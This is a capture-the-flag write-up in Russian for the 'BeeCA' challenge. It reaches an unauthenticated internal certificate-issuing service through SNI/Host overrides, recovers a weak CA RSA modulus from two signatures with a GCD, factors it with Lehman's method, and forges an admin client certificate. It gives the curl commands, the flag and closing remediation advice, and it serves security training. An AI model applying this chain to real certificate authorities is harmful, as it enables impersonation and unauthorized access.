# BeeCA

**Флаг:** `avito{uZUzUlEy_WeaK_CrYp7O_vIBeee}`

Административный сайт BeeCA требует клиентский сертификат с `CN=admin`, подписанный
BeeCA. Решение состоит из трёх шагов: получить две подписи одного CA, восстановить и
факторизовать его RSA-модуль, затем выпустить свой сертификат.

## Получение сертификатов

После Google OAuth портал создаёт заявку через `POST /api/enroll`. Значение `CN`
берётся из подтверждённого адреса почты; подмена полей запроса его не меняет.
Сертификат имеет `CA:FALSE`, поэтому подписывать им другие сертификаты нельзя.

В JavaScript портала есть имя `certissue-bv5kavo6.internal`. Оно не разрешается
публичным DNS, но сервер доступен на том же IP, что и портал. Нужно подменить и SNI,
и HTTP `Host`: одной замены заголовка недостаточно.

```bash
curl -sk -X POST --resolve certissue-bv5kavo6.internal:443:93.77.163.176 \
  'https://certissue-bv5kavo6.internal/internal/cert?uuid=<UUID1>&action=approve'
curl -H 'Cookie: beeca_session=<SESS>' \
  https://portal-bv5kavo6.beeca.avitoctf.ru/api/cert -o beeca-client.p12
openssl pkcs12 -in beeca-client.p12 -passin pass:beeca -nodes -clcerts \
  | openssl x509 -out beeca/leaf.crt
```

Внутренний обработчик не проверяет сессию или клиентский сертификат. Для второй
подписи нужно перевести первую заявку в `declined`, снова вызвать `/api/enroll`,
одобрить новый UUID и сохранить сертификат в `beeca/leaf2.crt`:

```bash
curl -sk -X POST --resolve certissue-bv5kavo6.internal:443:93.77.163.176 \
  'https://certissue-bv5kavo6.internal/internal/cert?uuid=<UUID1>&action=decline'
```

Повторный `/api/enroll` без отклонения заявки возвращает ту же запись, а не новую
подпись. В исследованном экземпляре новые сертификаты имели serial `0x1000` и `0x1001`.
Адреса и UUID в командах нужно заменить параметрами своего экземпляра.

## Восстановление ключа

Для PKCS#1 v1.5 известны подпись `s`, показатель `e` и закодированное сообщение `EM`.
Значение `s^e − EM` кратно RSA-модулю. НОД двух таких значений позволяет восстановить
`N`; результат проверяется на обеих подписях.

```text
N = gcd(s1^e − EM1, s2^e − EM2)
d = e⁻¹ mod ((p − 1)(q − 1))
```

В этой задаче множители связаны так, что метод Лемана находит разложение при `k=99`.
Скрипт сначала пробует малые делители, метод Ферма и общие множители, затем Лемана.
Из `(N, p, q, d)` он собирает ключ CA и подписывает сертификат `CN=admin` с
`issuer=CN=BeeCA,O=BeeCA`, `CA:FALSE` и `EKU=clientAuth`.

```bash
uv run python beeca/recover_ca_and_forge.py beeca/leaf.crt beeca/leaf2.crt
curl --cert admin_forged.crt --key admin_forged.key \
  https://admin-bv5kavo6.beeca.avitoctf.ru/
```

Ответ содержит `firstprompt.txt` с флагом.

## Файлы

[recover_ca_and_forge.py](recover_ca_and_forge.py) выполняет восстановление модуля,
факторизацию и выпуск сертификата. Два исходных сертификата нужно получить на стенде;
в Git их нет. Результаты `admin_forged.crt` и `admin_forged.key` создаются в текущем
каталоге. Сохранённый флаг — [FLAG.txt](FLAG.txt).

Исправление требует закрыть внутренний сервис выдачи сертификатов, проверять права
на изменение заявок и заменить слабые ключи CA.
